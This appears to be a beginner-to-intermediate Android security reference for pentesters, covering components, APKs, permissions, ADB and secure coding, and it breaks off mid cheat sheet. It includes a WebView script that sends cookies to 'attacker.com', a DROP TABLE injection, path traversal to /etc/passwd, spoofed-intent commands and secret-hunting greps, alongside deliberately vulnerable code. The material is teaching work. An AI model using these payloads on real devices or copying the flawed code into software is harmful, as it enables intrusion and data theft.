# 🤖 ANDROID FUNDAMENTALS & DEVELOPMENT BASICS

> 🔐 **The Ultimate Reference for Hackers, Pentesters & Security Researchers**  
> *Complete guide to Android architecture, development patterns, security model, and attack surfaces*

```
📊 Difficulty: 🟢 Beginner → 🟡 Intermediate
⏱️ Estimated Read: 45-60 min
🔄 Last Updated: 2026
```

---

## 📋 TABLE OF CONTENTS

```
1️⃣  Android Architecture Deep Dive
2️⃣  Core Components Explained
3️⃣  APK Structure & Build Process
4️⃣  Android Security Model
5️⃣  Development Fundamentals for Hackers
6️⃣  Essential ADB Commands
7️⃣  Debugging & Analysis Basics
8️⃣  Common Dev Patterns → Security Risks
9️⃣  Secure Development Best Practices
🔟  Tools & Environment Setup
1️⃣1️⃣ Quick Reference Tables
1️⃣2️⃣ References & Further Learning
```

---

## 1️⃣ ANDROID ARCHITECTURE DEEP DIVE

### 🏗️ Android Stack Layers

```
┌─────────────────────────────────────┐
│           APPLICATIONS              │ ← Your target (APKs)
│  • System apps (Settings, Phone)    │
│  • Third-party apps (your targets)  │
├─────────────────────────────────────┤
│      APPLICATION FRAMEWORK          │ ← Java/Kotlin APIs
│  • Activity Manager                 │
│  • Window Manager                   │
│  • Content Providers                │
│  • Notification Manager             │
│  • Package Manager                  │
├─────────────────────────────────────┤
│    ANDROID RUNTIME + LIBRARIES      │
│  • ART (Android Runtime)            │
│  • Core Libraries (java.*)          │
│  • Native Libraries (libc, libssl)  │
│  • WebKit, OpenGL, Media Framework  │
├─────────────────────────────────────┤
│         HARDWARE ABSTRACTION        │
│  • Camera, Audio, Sensors, GPS      │
│  • Bluetooth, NFC, Wi-Fi drivers    │
├─────────────────────────────────────┤
│           LINUX KERNEL              │
│  • Process management               │
│  • Memory management                │
│  • Security (SELinux, permissions)  │
│  • Power management                 │
└─────────────────────────────────────┘
```

### 🔑 Key Architectural Concepts

| Concept | Description | Security Relevance |
|---------|-------------|-------------------|
| **Application Sandbox** | Each app runs in isolated Linux process with unique UID | Prevents app-to-app data access without explicit permission |
| **Permission Model** | Apps declare required permissions in manifest | Attack surface: over-privileged apps, permission escalation |
| **Component-Based** | Apps built from Activities, Services, Receivers, Providers | Attack surface: exported components, intent injection |
| **IPC via Intents** | Components communicate via Intent messages | Attack surface: intent spoofing, data leakage |
| **Binder IPC** | Low-level mechanism for cross-process communication | Attack surface: Binder exploitation, service hijacking |

---

## 2️⃣ CORE COMPONENTS EXPLAINED

### 📱 The Four App Components

#### **1. Activity** - UI Screen
```java
// Basic Activity structure
public class MainActivity extends AppCompatActivity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        // 🔍 Hacker Note: Check for sensitive data in:
        // - getIntent().getExtras()
        // - savedInstanceState
        // - WebView.loadUrl()
    }
}
```

**Manifest Declaration:**
```xml
<activity 
    android:name=".MainActivity"
    android:exported="true"  <!-- ⚠️ Exported = attackable -->
    android:launchMode="singleTask">
    
    <!-- Intent Filter = Entry Point -->
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <data android:scheme="myapp" android:host="auth" />
    </intent-filter>
</activity>
```

**🎯 Attack Surfaces:**
```bash
# Launch exported activity with malicious extras
adb shell am start -n com.app/.AdminActivity \
  --es "is_admin" "true" \
  --es "user_id" "1"

# Trigger deep link
adb shell am start -a android.intent.action.VIEW \
  -d "myapp://auth?token=ATTACKER_TOKEN" com.app

# Fuzz intent extras for crashes/vulns
```

---

#### **2. Service** - Background Operations
```java
// Started Service (runs indefinitely)
public class BackgroundService extends Service {
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // 🔍 Check: Does it process intent extras without validation?
        String command = intent.getStringExtra("command");
        executeCommand(command);  // ⚠️ Potential RCE
        return START_STICKY;
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return null;  // Not bound = can't interact directly
    }
}
```

**Bound Service (Client-Server IPC):**
```java
public class BoundService extends Service {
    private final IBinder binder = new LocalBinder();
    
    public class LocalBinder extends Binder {
        BoundService getService() {
            return BoundService.this;
        }
    }
    
    @Override
    public IBinder onBind(Intent intent) {
        return binder;  // 🔍 Check: Is binder protected by permission?
    }
    
    // 🔍 Hacker Note: Bound methods may expose sensitive functionality
    public String getAuthToken() { return authToken; }  // ⚠️ Data leak
}
```

**🎯 Attack Surfaces:**
```bash
# Start service with malicious intent
adb shell am startservice \
  -n com.app/.BackgroundService \
  --es "command" "delete_all_data"

# Bind to exported service (if possible)
# Requires custom code or Frida instrumentation
```

---

#### **3. Broadcast Receiver** - Event Listener
```java
// Static Receiver (manifest-registered)
<receiver 
    android:name=".BootReceiver"
    android:exported="true">  <!-- ⚠️ Can receive broadcasts from any app -->
    <intent-filter>
        <action android:name="android.intent.action.BOOT_COMPLETED" />
    </intent-filter>
</receiver>

// Dynamic Receiver (code-registered)
public class NetworkReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        // 🔍 Check: Does it trust intent data?
        String action = intent.getAction();
        String data = intent.getStringExtra("sensitive_data");  // ⚠️ May be spoofed
    }
}
```

**🎯 Attack Surfaces:**
```bash
# Send malicious broadcast to exported receiver
adb shell am broadcast \
  -a com.app.CUSTOM_ACTION \
  --es "command" "factory_reset" \
  --es "confirm" "yes"

# Fuzz broadcast actions for hidden receivers
adb shell dumpsys package com.app | grep -i receiver
```

---

#### **4. Content Provider** - Data Sharing
```java
public class UserProvider extends ContentProvider {
    // URI definition
    public static final Uri CONTENT_URI = 
        Uri.parse("content://com.app.provider/users");
    
    @Override
    public Cursor query(Uri uri, String[] projection, 
                       String selection, String[] selectionArgs,
                       String sortOrder) {
        // 🔍 CRITICAL: Check for SQL injection in selection/selectionArgs
        // 🔍 CRITICAL: Check for path traversal in URI
        // 🔍 CRITICAL: Is provider exported without permission?
        return database.query(...);
    }
    
    @Override
    public int update(Uri uri, ContentValues values, 
                     String selection, String[] selectionArgs) {
        // 🔍 Can attacker modify arbitrary records?
        return database.update(...);
    }
}
```

**Manifest Declaration:**
```xml
<provider
    android:name=".UserProvider"
    android:authorities="com.app.provider"
    android:exported="true"  <!-- ⚠️ Accessible by other apps -->
    android:readPermission="com.app.permission.READ"  <!-- ✅ Protected -->
    android:writePermission="com.app.permission.WRITE">
    
    <!-- URI path patterns -->
    <path-permission 
        android:pathPrefix="/users"
        android:readPermission="com.app.permission.READ_USERS" />
</provider>
```

**🎯 Attack Surfaces:**
```bash
# Query exported content provider
adb shell content query --uri content://com.app.provider/users

# SQL injection via projection parameter
adb shell content query \
  --uri content://com.app.provider/data \
  --projection "name); DROP TABLE users;--"

# Path traversal attempt
adb shell content query \
  --uri "content://com.app.files/../../../etc/passwd"

# Check provider permissions
adb shell dumpsys package com.app | grep -A10 provider
```

---

## 3️⃣ APK STRUCTURE & BUILD PROCESS

### 📦 APK File Anatomy

```
app-release.apk (actually a ZIP file)
│
├── 📄 AndroidManifest.xml          # App configuration (decompiled from binary)
│   • Package name, version, minSdk
│   • Permissions requested
│   • Component declarations (activities, services, etc.)
│   • Intent filters (entry points)
│
├── 📄 classes.dex                   # Compiled Java/Kotlin bytecode (Dalvik)
│   • Multiple dex files if >64K methods
│   • Can be decompiled to Java-like code with jadx
│
├── 📄 resources.arsc               # Compiled resources index
│   • String tables, layout references
│   • Useful for finding hardcoded strings
│
├── 📁 res/                          # Uncompiled resources
│   • layout/*.xml    → UI definitions
│   • values/*.xml    → Strings, colors, dimensions
│   • drawable/*      → Images, icons
│   • 🔍 Check for: hardcoded URLs, API keys in strings.xml
│
├── 📁 assets/                       # Raw asset files
│   • HTML, JS, databases, configs
│   • 🔍 Check for: embedded credentials, debug configs
│
├── 📁 lib/                          # Native libraries (.so files)
│   • lib/armeabi-v7a/, arm64-v8a/, x86/
│   • 🔍 Check for: crypto implementations, anti-debugging code
│
├── 📁 META-INF/                     # Signing certificates
│   • MANIFEST.MF, CERT.SF, CERT.RSA
│   • 🔍 Verify signature integrity
│
└── 📄 kotlin/                       # Kotlin metadata (if applicable)
```

### 🔧 APK Build Process (For Understanding Attack Surface)

```
Java/Kotlin Source Code
        │
        ▼
┌─────────────────┐
│   Compilation   │
│ • javac / kotlinc│
│ • Generates .class files │
└─────────────────┘
        │
        ▼
┌─────────────────┐
│   D8/R8 Dexer   │
│ • Converts .class → .dex │
│ • Tree shaking, optimization │
│ • ⚠️ Obfuscation if ProGuard/R8 enabled │
└─────────────────┘
        │
        ▼
┌─────────────────┐
│   Resource      │
│   Compilation   │
│ • aapt2 compiles resources │
│ • Generates resources.arsc │
└─────────────────┘
        │
        ▼
┌─────────────────┐
│   APK Packaging │
│ • All files bundled into .apk │
│ • Manifest merged from modules │
└─────────────────┘
        │
        ▼
┌─────────────────┐
│   Signing       │
│ • apksigner / jarsigner │
│ • v1 (JAR), v2/v3 (APK) schemes │
│ • ⚠️ Debug builds signed with debug key │
└─────────────────┘
        │
        ▼
┌─────────────────┐
│   Alignment     │
│ • zipalign optimizes for memory │
│ • Required for Play Store │
└─────────────────┘
```

### 🔍 APK Analysis Commands

```bash
# Quick manifest extraction
unzip -p app.apk AndroidManifest.xml | strings | head -100

# Proper manifest decompilation (binary XML → readable)
apktool d app.apk -o output_dir
cat output_dir/AndroidManifest.xml

# List all classes/methods (via jadx)
jadx -d jadx_output app.apk
grep -r "class " jadx_output/ --include="*.java" | head -20

# Extract all strings (find hardcoded secrets)
unzip -q app.apk -d temp_apk
grep -r "password\|api_key\|secret\|token" temp_apk/ --include="*.xml" --include="*.json" -i

# Check signing info
apksigner verify --print-certs app.apk
keytool -printcert -jarfile app.apk

# Extract native libraries for analysis
unzip app.apk "lib/*" -d native_libs
file native_libs/lib/armeabi-v7a/*.so
```

---

## 4️⃣ ANDROID SECURITY MODEL

### 🔐 Permission System

#### **Permission Levels**
```xml
<!-- Normal: Auto-granted, low risk -->
<permission android:name="android.permission.INTERNET" 
            android:protectionLevel="normal" />

<!-- Dangerous: User must grant at runtime (Android 6.0+) -->
<permission android:name="android.permission.CAMERA" 
            android:protectionLevel="dangerous" />

<!-- Signature: Only apps signed with same cert can use -->
<permission android:name="com.app.permission.ADMIN" 
            android:protectionLevel="signature" />

<!-- System: Only system apps can use -->
<permission android:name="android.permission.REBOOT" 
            android:protectionLevel="system|signature" />
```

#### **Runtime Permission Flow (Android 6.0+)**
```java
// App must request dangerous permissions at runtime
if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
        != PackageManager.PERMISSION_GRANTED) {
    
    // Show rationale (optional but recommended)
    if (ActivityCompat.shouldShowRequestPermissionRationale(...)) {
        // Explain why permission is needed
    }
    
    // Request permission
    ActivityCompat.requestPermissions(this, 
        new String[]{Manifest.permission.CAMERA}, 
        REQUEST_CODE);
} else {
    // Permission already granted - proceed
    openCamera();
}

// Handle user response
@Override
public void onRequestPermissionsResult(int requestCode, 
        String[] permissions, int[] grantResults) {
    if (grantResults[0] == PackageManager.PERMISSION_GRANTED) {
        openCamera();
    } else {
        // Handle denial gracefully
        showPermissionDeniedMessage();
    }
}
```

**🎯 Hacker Testing Checklist:**
```bash
# List app permissions
adb shell dumpsys package com.app | grep permission

# Check which permissions are granted
adb shell pm list permissions -g -d | grep com.app

# Test with revoked permissions
adb shell pm revoke com.app android.permission.CAMERA

# Check for permission escalation vectors
# Look for: exported components that don't check caller permissions
```

---

### 🧱 Application Sandbox

```
Each Android app runs in its own Linux process with:
├── Unique UID (e.g., u0_a123)
├── Isolated file system: /data/data/com.app/
├── Isolated SharedPreferences, databases, files
├── SELinux context: u:r:untrusted_app:s0
└── Network access controlled by firewall rules
```

**Sandbox Bypass Vectors:**
```java
// 1. World-readable files (deprecated but still found)
openFileOutput("data.txt", MODE_WORLD_READABLE);  // ⚠️ Insecure

// 2. Exported Content Providers
// Allows other apps to query your data

// 3. Shared User ID (rare, requires same signature)
<manifest android:sharedUserId="com.shared.id" ...>

// 4. FileProvider misconfiguration
<provider android:name="androidx.core.content.FileProvider"
          android:authorities="com.app.fileprovider"
          android:exported="true"  <!-- ⚠️ -->
          android:grantUriPermissions="true">
    <paths>
        <external-path name="external" path="." />  <!-- ⚠️ Too broad -->
    </paths>
</provider>
```

---

### 🔒 Network Security Configuration

#### **Default Behavior (Android 9+)**
```xml
<!-- cleartextTrafficPermitted defaults to false -->
<!-- HTTPS required unless explicitly allowed -->
```

#### **Custom Configuration (vulnerable patterns)**
```xml
<!-- ⚠️ Allow cleartext HTTP (insecure) -->
<network-security-config>
    <base-config cleartextTrafficPermitted="true" />
</network-security-config>

<!-- ⚠️ Trust user certificates (enables MITM) -->
<network-security-config>
    <base-config>
        <trust-anchors>
            <certificates src="system" />
            <certificates src="user" />  <!-- ⚠️ Risky -->
        </trust-anchors>
    </base-config>
</network-security-config>

<!-- ⚠️ Disable certificate pinning for debug -->
<network-security-config>
    <debug-overrides>
        <trust-anchors>
            <certificates src="user" />
        </trust-anchors>
    </debug-overrides>
</network-security-config>
```

**🎯 Testing Network Config:**
```bash
# Check if app allows cleartext traffic
adb shell dumpsys package com.app | grep -i cleartext

# Test MITM with Burp (if user certs trusted)
# Install Burp CA as user certificate
adb push burp.der /sdcard/
adb shell su -c "cp /sdcard/burp.der /system/etc/security/cacerts/$(openssl x509 -inform DER -in /sdcard/burp.der -noout -hash).0"

# Monitor traffic
adb shell dumpsys package com.app | grep -A20 "Network Security Config"
```

---

## 5️⃣ DEVELOPMENT FUNDAMENTALS FOR HACKERS

### 🧩 Understanding Common Code Patterns

#### **SharedPreferences (Often Contains Secrets)**
```java
// Vulnerable: Storing sensitive data unencrypted
SharedPreferences prefs = getSharedPreferences("auth", MODE_PRIVATE);
prefs.edit()
    .putString("password", "plain_text_password")  // ⚠️
    .putString("api_token", "sk-xxxxx")             // ⚠️
    .apply();

// Better: Use Android Keystore for encryption
// But many apps don't implement this properly

// 🔍 Hacker: Where to find SharedPreferences
// Path: /data/data/com.app/shared_prefs/
adb shell "run-as com.app cat shared_prefs/auth.xml"
```

#### **SQLite Database (Common Data Leak Source)**
```java
// Vulnerable: SQL injection via string concatenation
String query = "SELECT * FROM users WHERE username = '" + userInput + "'";
Cursor cursor = db.rawQuery(query, null);  // ⚠️ SQLi possible

// Secure: Use parameterized queries
String query = "SELECT * FROM users WHERE username = ?";
Cursor cursor = db.rawQuery(query, new String[]{userInput});

// 🔍 Hacker: Database location
// Path: /data/data/com.app/databases/
adb shell "run-as com.app ls databases/"
adb shell "run-as com.app cat databases/app.db"  # May need sqlite3
```

#### **WebView (Major Attack Surface)**
```java
// ⚠️ Dangerous WebView configuration
WebView webView = findViewById(R.id.webview);
WebSettings settings = webView.getSettings();

settings.setJavaScriptEnabled(true);  // Enables JS execution
settings.setAllowFileAccess(true);     // Allows file:// access
settings.setAllowContentAccess(true);  // Allows content:// access

// ⚠️ JavaScriptInterface = RCE vector
webView.addJavascriptInterface(new MyJSInterface(), "Android");

public class MyJSInterface {
    @JavascriptInterface
    public String exec(String cmd) {
        return Runtime.getRuntime().exec(cmd);  // ⚠️ Direct RCE!
    }
}

// ⚠️ Debugging enabled in production
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
    WebView.setWebContentsDebuggingEnabled(true);  // ⚠️ Exposes WebView to remote debugging
}

// Secure WebView setup
settings.setJavaScriptEnabled(false);  // Disable if not needed
webView.setWebViewClient(new WebViewClient());  // Keep navigation in-app
webView.removeJavascriptInterface("Android");  // Remove dangerous interfaces
```

**🎯 WebView Exploitation:**
```html
<!-- If JavaScriptInterface exposed, load this in WebView -->
<script>
  // Call exposed Java method
  Android.exec('ls /data/data/com.app');
  
  // Exfiltrate data
  var xhr = new XMLHttpRequest();
  xhr.open('GET', 'https://attacker.com/steal?data=' + document.cookie);
  xhr.send();
</script>
```

#### **Intent Handling (Common Logic Flaw)**
```java
// ⚠️ Implicit intent without validation - can be hijacked
Intent intent = new Intent(Intent.ACTION_VIEW);
intent.setData(Uri.parse("https://example.com"));
startActivity(intent);  // User can choose malicious app

// ⚠️ Explicit intent to exported component without permission check
Intent intent = new Intent(this, AdminActivity.class);
intent.putExtra("is_admin", true);  // ⚠️ Any app can send this
startActivity(intent);

// ⚠️ PendingIntent with mutable flag (Android 11-)
PendingIntent pi = PendingIntent.getActivity(
    context, 0, intent, PendingIntent.FLAG_MUTABLE);  // ⚠️ Can be modified

// Secure patterns
// 1. Use explicit intents with component name
Intent intent = new Intent();
intent.setComponent(new ComponentName("com.trusted.app", "com.trusted.app.Activity"));

// 2. Validate incoming intent data
@Override
protected void onCreate(Bundle savedInstanceState) {
    Intent intent = getIntent();
    if (intent.hasExtra("admin_mode")) {
        // ⚠️ Verify caller identity
        if (getCallingPackage() != null && 
            getCallingPackage().equals("com.trusted.admin")) {
            // Proceed
        }
    }
}

// 3. Use immutable PendingIntents (Android 12+)
PendingIntent.FLAG_IMMUTABLE
```

---

## 6️⃣ ESSENTIAL ADB COMMANDS FOR HACKERS

### 📱 Device Management
```bash
# List connected devices
adb devices
adb devices -l  # With details

# Connect wirelessly (Android 11+)
adb pair 192.168.1.100:12345  # From device pairing code
adb connect 192.168.1.100:5555

# Reboot options
adb reboot
adb reboot bootloader
adb reboot recovery
```

### 📦 App Management
```bash
# Install/uninstall
adb install app.apk
adb install -r app.apk              # Reinstall with data
adb install -d app-debug.apk        # Allow downgrade
adb uninstall com.package.name

# List packages
adb shell pm list packages                     # All packages
adb shell pm list packages -3                  # Third-party only
adb shell pm list packages | grep target       # Search
adb shell pm path com.package.name             # APK location

# Clear app data
adb shell pm clear com.package.name

# Grant/revoke permissions
adb shell pm grant com.package android.permission.SEND_SMS
adb shell pm revoke com.package android.permission.SEND_SMS

# List permissions for app
adb shell dumpsys package com.package | grep permission
```

### 🗂️ File Operations
```bash
# Push/pull files
adb push local.txt /sdcard/remote.txt
adb pull /sdcard/remote.txt ./local.txt

# Access app private data (requires root or run-as)
adb shell
run-as com.package.name  # Switch to app's user
ls /data/data/com.package.name/
cat shared_prefs/auth.xml

# Without run-as (if device rooted)
adb shell su -c "cat /data/data/com.package.name/shared_prefs/auth.xml"

# List all files recursively
adb shell "run-as com.package.name find /data/data/com.package.name -type f"
```

### 🎭 Activity & Intent Control
```bash
# Start main activity
adb shell monkey -p com.package.name -c android.intent.category.LAUNCHER 1

# Start specific activity
adb shell am start -n com.package.name/.MainActivity

# Start with extras
adb shell am start -n com.package.name/.Login \
  --es "username" "admin" \
  --es "password" "test123" \
  --ez "remember_me" "true"

# Send broadcast
adb shell am broadcast -a android.intent.action.BOOT_COMPLETED
adb shell am broadcast -a com.package.CUSTOM_ACTION \
  --es "command" "delete_data"

# Force stop
adb shell am force-stop com.package.name

# Start service
adb shell am startservice -n com.package.name/.BackgroundService \
  --es "param" "value"
```

### 🔍 Debugging & Monitoring
```bash
# Real-time logs
adb logcat                              # All logs
adb logcat -v threadtime                # With timestamps
adb logcat -s TAG:D *:S                 # Filter by tag
adb logcat | grep -i "com.package"      # Filter by package

# Save logs
adb logcat -d -v time > logs.txt
adb logcat -b crash                     # Crash logs only

# Process info
adb shell ps -A | grep com.package
adb shell top -m 10                     # Top CPU processes
adb shell dumpsys meminfo com.package   # Memory usage

# Network stats
adb shell dumpsys netstats | grep com.package
adb shell cat /proc/net/xt_qtaguid/stats | grep com.package
```

### 🔐 Security Testing Commands
```bash
# Check if debuggable
adb shell dumpsys package com.package | grep debuggable

# Check backup status
adb shell bmgr list sets com.package

# Test deep links
adb shell am start -W -a android.intent.action.VIEW \
  -d "scheme://host/path?param=value" com.package

# List exported components
adb shell dumpsys package com.package | grep -A5 "Activity Resolver"
adb shell dumpsys package com.package | grep -A5 "Receiver Resolver"

# Check for cleartext traffic
adb shell dumpsys package com.package | grep -i cleartext
```

---

## 7️⃣ DEBUGGING & ANALYSIS BASICS

### 🐛 Enabling Debugging

#### **On Physical Device**
```
1. Settings → About Phone → Tap "Build Number" 7 times
2. Settings → Developer Options → Enable:
   ✓ USB Debugging
   ✓ Stay Awake (screen won't sleep)
   ✓ Allow mock locations (for testing)
   ✓ Disable permission monitoring (optional)
3. Connect via USB → Accept RSA fingerprint on device
```

#### **On Emulator (Android Studio)**
```bash
# Launch emulator with writable system (for advanced testing)
emulator -avd Pixel_5_API_30 -writable-system

# Enable root in emulator
adb root
adb remount
```

### 🔬 Logcat Analysis

#### **Filtering Techniques**
```bash
# By package
adb logcat --pid=$(adb shell pidof -s com.package)

# By log level
adb logcat *:E  # Errors only
adb logcat *:W  # Warnings and above

# By tag
adb logcat -s WebViewChromium:D *:S
adb logcat -s NetworkSecurityConfig:D *:S

# Search patterns
adb logcat | grep -i "exception\|error\|crash"
adb logcat | grep -i "token\|password\|auth"  # Find leaked secrets
```

#### **Common Log Patterns to Hunt**
```
✅ "D/WebView" - WebView navigation/JS execution
✅ "D/NetworkSecurityConfig" - SSL/TLS issues
✅ "W/Activity" - Activity lifecycle issues
✅ "E/AndroidRuntime" - Crashes/exceptions
✅ "D/SQLiteDatabase" - Database queries
✅ "I/chatty" - Thread names (may reveal background ops)
```

### 🧪 Runtime Inspection

#### **Check Running Processes**
```bash
adb shell ps -A | grep com.package
adb shell top -m 5 -n 1 | grep com.package

# Get process details
adb shell dumpsys activity processes | grep -A20 com.package
```

#### **Inspect Activity Stack**
```bash
adb shell dumpsys activity activities | grep -A5 com.package
adb shell dumpsys window windows | grep -E 'mCurrentFocus|mFocusedApp'
```

#### **Check Services**
```bash
adb shell dumpsys activity services com.package
adb shell dumpsys service | grep -A10 com.package
```

---

## 8️⃣ COMMON DEV PATTERNS → SECURITY RISKS

### 🚨 Pattern 1: Hardcoded Credentials
```java
// ❌ Vulnerable
String API_KEY = "sk-proj-xxxxxxxxxxxxxxxx";
String PASSWORD = "admin123";

SharedPreferences prefs = getSharedPreferences("config", MODE_PRIVATE);
prefs.edit().putString("master_key", "hardcoded_value").apply();

// 🔍 How to find
grep -r "password\|api_key\|secret\|token" jadx_output/ -i
strings app.apk | grep -i "sk-\|Bearer\|key_"

// ✅ Secure
// Use Android Keystore + user authentication
// Fetch secrets from secure backend after auth
```

### 🚨 Pattern 2: Insecure Logging
```java
// ❌ Vulnerable
Log.d("Auth", "User token: " + authToken);  // Leaked in logcat!
Log.e("API", "Response: " + jsonResponse);  // May contain PII

// 🔍 How to find
adb logcat | grep -i "token\|password\|secret"
grep -r "Log\.\(d\|e\|i\|v\|w\)" jadx_output/ --include="*.java"

// ✅ Secure
// Remove sensitive data from logs
// Use BuildConfig.DEBUG flag for debug-only logs
if (BuildConfig.DEBUG) {
    Log.d("Debug", "Non-sensitive info only");
}
```

### 🚨 Pattern 3: Weak Cryptography
```java
// ❌ Vulnerable
// ECB mode (patterns visible in ciphertext)
Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");

// Weak key
SecretKeySpec key = new SecretKeySpec("1234567890123456".getBytes(), "AES");

// Custom "encryption"
byte[] encrypt(byte[] data) {
    for(int i=0; i<data.length; i++) data[i] ^= 0x42;  // XOR cipher!
    return data;
}

// MD5/SHA1 for passwords
MessageDigest md = MessageDigest.getInstance("MD5");

// 🔍 How to find
grep -r "Cipher\|MessageDigest\|SecretKey" jadx_output/ --include="*.java"
grep -r "AES/ECB\|DES\|MD5\|SHA1" jadx_output/ --include="*.java"

// ✅ Secure
// Use AES/GCM/NoPadding with random IV
// Use PBKDF2/Argon2 for password hashing
// Use Android Keystore for key storage
```

### 🚨 Pattern 4: Deep Link Validation Bypass
```java
// ❌ Vulnerable
@Override
protected void onCreate(Bundle savedInstanceState) {
    Uri data = getIntent().getData();
    if (data != null) {
        String token = data.getQueryParameter("token");
        // ⚠️ No validation of token source or signature
        loginWithToken(token);
    }
}

// 🔍 How to test
adb shell am start -a android.intent.action.VIEW \
  -d "myapp://auth?token=ATTACKER_TOKEN" com.app

// ✅ Secure
// Validate token signature server-side
// Use short-lived tokens with nonce
// Verify referrer/origin when possible
```

### 🚨 Pattern 5: Exported Component Without Permission
```xml
<!-- ❌ Vulnerable -->
<activity android:name=".AdminPanel" android:exported="true" />
<!-- Any app can launch this activity -->

<provider android:name=".DataProvider" 
          android:authorities="com.app.data"
          android:exported="true" />
<!-- Any app can query this provider -->

<!-- ✅ Secure -->
<activity android:name=".AdminPanel" 
          android:exported="true"
          android:permission="com.app.permission.ADMIN" />

<provider android:name=".DataProvider"
          android:authorities="com.app.data"
          android:exported="true"
          android:readPermission="com.app.permission.READ_DATA"
          android:writePermission="com.app.permission.WRITE_DATA" />
```

---

## 9️⃣ SECURE DEVELOPMENT BEST PRACTICES

### ✅ Security Checklist for Developers

#### **Manifest Security**
```xml
<!-- 1. Minimize permissions -->
<uses-permission android:name="android.permission.INTERNET" />
<!-- Only request what you actually need -->

<!-- 2. Disable backup for sensitive apps -->
<application 
    android:allowBackup="false"
    android:fullBackupContent="false">

<!-- 3. Disable cleartext traffic -->
<application android:usesCleartextTraffic="false">

<!-- 4. Protect exported components -->
<activity android:exported="true" 
          android:permission="com.app.permission.MY_PERMISSION">

<!-- 5. Use network security config -->
<network-security-config>
    <base-config cleartextTrafficPermitted="false">
        <trust-anchors>
            <certificates src="system" />
        </trust-anchors>
    </base-config>
</network-security-config>
```

#### **Code Security**
```java
// 1. Validate all input
public void processInput(String input) {
    if (input == null || !input.matches("[a-zA-Z0-9]+")) {
        throw new IllegalArgumentException("Invalid input");
    }
    // Process safely...
}

// 2. Use parameterized queries
String query = "SELECT * FROM users WHERE id = ?";
db.rawQuery(query, new String[]{userId});

// 3. Secure WebView
webView.getSettings().setJavaScriptEnabled(false);
webView.setWebViewClient(new WebViewClient());

// 4. Store secrets in Keystore
KeyStore keyStore = KeyStore.getInstance("AndroidKeyStore");
keyStore.load(null);
// ... proper key generation and usage

// 5. Certificate pinning (OkHttp example)
CertificatePinner pinner = new CertificatePinner.Builder()
    .add("api.example.com", "sha256/AAAAAAAAAAAAAAAAAAAAAAAAAAA=")
    .build();
OkHttpClient client = new OkHttpClient.Builder()
    .certificatePinner(pinner)
    .build();
```

#### **Build & Release Security**
```bash
# 1. Use release builds for production
# Disable debug features
android:debuggable="false"

# 2. Enable code obfuscation (ProGuard/R8)
# proguard-rules.pro
-keepclasseswithmembernames class * {
    native <methods>;
}
-dontwarn okhttp3.**
-keep class okhttp3.** { *; }

# 3. Sign with release key (not debug)
# Store keystore securely, never in version control

# 4. Enable Play App Signing
# Let Google manage app signing keys

# 5. Use SafetyNet/Play Integrity API
// Verify app integrity at runtime
SafetyNet.getClient(context).attest(nonce, API_KEY);
```

---

## 🔟 TOOLS & ENVIRONMENT SETUP

### 🛠️ Essential Free Tools

| Tool | Purpose | Install Command |
|------|---------|----------------|
| **Android SDK Platform Tools** | ADB, Fastboot | `sudo apt install android-tools-adb` |
| **APKTool** | Decode/Rebuild APKs | `wget https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.9.0.jar` |
| **Jadx** | Java Decompiler | `wget https://github.com/skylot/jadx/releases/download/v1.4.7/jadx-1.4.7.zip` |
| **Frida** | Dynamic Instrumentation | `pip3 install frida-tools` |
| **MobSF** | Automated Analysis | `git clone https://github.com/MobSF/Mobile-Security-Framework-MobSF` |
| **Burp Suite Community** | Traffic Interception | Download from portswigger.net |
| **Genymotion** | Android Emulator | Download from genymotion.com |

### 🐳 Docker Lab Setup (One Command)
```yaml
# docker-compose.yml
version: '3.8'
services:
  mobsf:
    image: opensecurity/mobile-security-framework-mobsf:latest
    ports:
      - "8000:8000"
    volumes:
      - ./mobsf_data:/home/mobsf/Mobile-Security-Framework-MobSF/userdata
  
  android-emulator:
    image: butomo1989/docker-android-x86-8.1:latest
    ports:
      - "6080:6080"   # Web VNC interface
      - "5554:5554"   # ADB connection
    privileged: true
    environment:
      - DEVICE=Samsung Galaxy S10
      - CONNECT_TO_HOST=true
```

```bash
# Start your mobile pentest lab
docker-compose up -d

# Access:
# • MobSF: http://localhost:8000
# • Emulator: http://localhost:6080
# • ADB: adb connect localhost:5555
```

### 🔧 VS Code Setup for Android Analysis
```json
// .vscode/settings.json
{
  "files.associations": {
    "*.smali": "smali",
    "*.dex": "hex"
  },
  "editor.defaultFormatter": "esbenp.prettier-vscode",
  "markdownlint.config": {
    "default": true,
    "MD013": false
  }
}
```

---

## 1️⃣1️⃣ QUICK REFERENCE TABLES

### 📊 Component Attack Surface Summary

| Component | Exported? | Common Attack | Mitigation |
|-----------|-----------|--------------|------------|
| **Activity** | Yes + intent-filter | Intent injection, deep link abuse | Validate intent data, use permissions |
| **Service** | Yes | Privilege escalation, DoS | Protect with permissions, validate input |
| **Broadcast Receiver** | Yes | Intent spoofing, command injection | Use signature-level permissions, validate |
| **Content Provider** | Yes | SQL injection, path traversal, data leak | Use permissions, parameterized queries, path validation |

### 🔐 Permission Risk Levels

| Permission | Risk | Why |
|------------|------|-----|
| `READ_SMS` / `SEND_SMS` | 🔴 High | Can read/send messages, 2FA bypass |
| `READ_CONTACTS` | 🔴 High | PII exposure, social engineering |
| `CAMERA` / `RECORD_AUDIO` | 🟡 Medium | Privacy violation, surveillance |
| `ACCESS_FINE_LOCATION` | 🟡 Medium | Location tracking, physical safety |
| `READ_EXTERNAL_STORAGE` | 🟡 Medium | Access to user files, photos |
| `INTERNET` | 🟢 Low (but monitor) | Required for most apps, but watch for data exfiltration |

### 🧭 ADB Command Cheat Sheet

```bash
# Device
adb devices                          # List devices
adb reboot                         # Reboot device
adb root                           # Restart adbd as root (if allowed)

# App
adb install app.apk                # Install APK
adb uninstall com.package          # Uninstall app
adb shell pm clear com.package     # Clear app data

# File
adb push local /sdcard/remote      # Upload file
adb pull /sdcard/remote local      # Download file
adb shell "run-as com.pkg cat file" # Read app-private file

# Activity
